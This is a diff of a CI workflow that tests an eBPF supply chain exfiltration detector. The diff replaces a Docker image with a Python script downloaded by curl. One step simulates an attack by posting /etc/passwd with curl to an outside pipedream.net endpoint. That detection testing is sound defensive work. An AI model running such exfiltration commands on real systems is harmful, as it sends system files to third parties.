@@ -1,4 +1,4 @@
-name: Run eBPF Supply Chain Detector
+name: Run eBPF Supply Chain Detector (Python)
 
 on:
   push:
@@ -9,31 +9,37 @@ jobs:
     runs-on: self-hosted
 
     steps:
-      - name: Pull latest image
-        run: docker pull rohitcoder/supplychain:latest
+      - name: Install BCC dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y bpfcc-tools linux-headers-$(uname -r) python3-pip
+          pip3 install bcc
+
+      - name: Download supplychain-detect.py
+        run: |
+          curl -L https://raw.githubusercontent.com/rohitcoder/rootconf-25-supplychain/main/supplychain-detect.py -o supplychain-detect.py
+          chmod +x supplychain-detect.py
 
       - name: Run eBPF supply chain detector in background
         run: |
-            docker run -d --name ebpf_detector1 --privileged \
-            --pid=host \
-            --network=host \
-            -v /sys:/sys \
-            -v /proc:/proc \
-            -v /lib/modules:/lib/modules \
-            -v /usr/src:/usr/src \
-            rohitcoder/supplychain:latest
+          nohup python3 supplychain-detect.py > detect.log 2>&1 &
+          echo $! > detector.pid
 
       - name: Wait for eBPF to attach
-        run: sleep 10
+        run: sleep 5
 
-      - name: Simulate supply chain exfiltration
+      - name: Simulate supply chain exfiltration from host
         run: |
-          curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net --data-binary "@/etc/passwd"
+          curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net \
+            --data-binary "@/etc/passwd"
 
-      - name: Save detector logs to file
+      - name: Wait for detector to log event
+        run: sleep 5
+
+      - name: Show detector logs
+        run: cat detect.log
+
+      - name: Cleanup background process
         run: |
-          docker logs ebpf_detector > ebpf_logs.txt
-          cat ebpf_logs.txt
-
-      - name: Stop and cleanup
-        run: docker rm -f ebpf_detector1
+          kill -9 $(cat detector.pid) || true
+          rm -f detector.pid detect.log
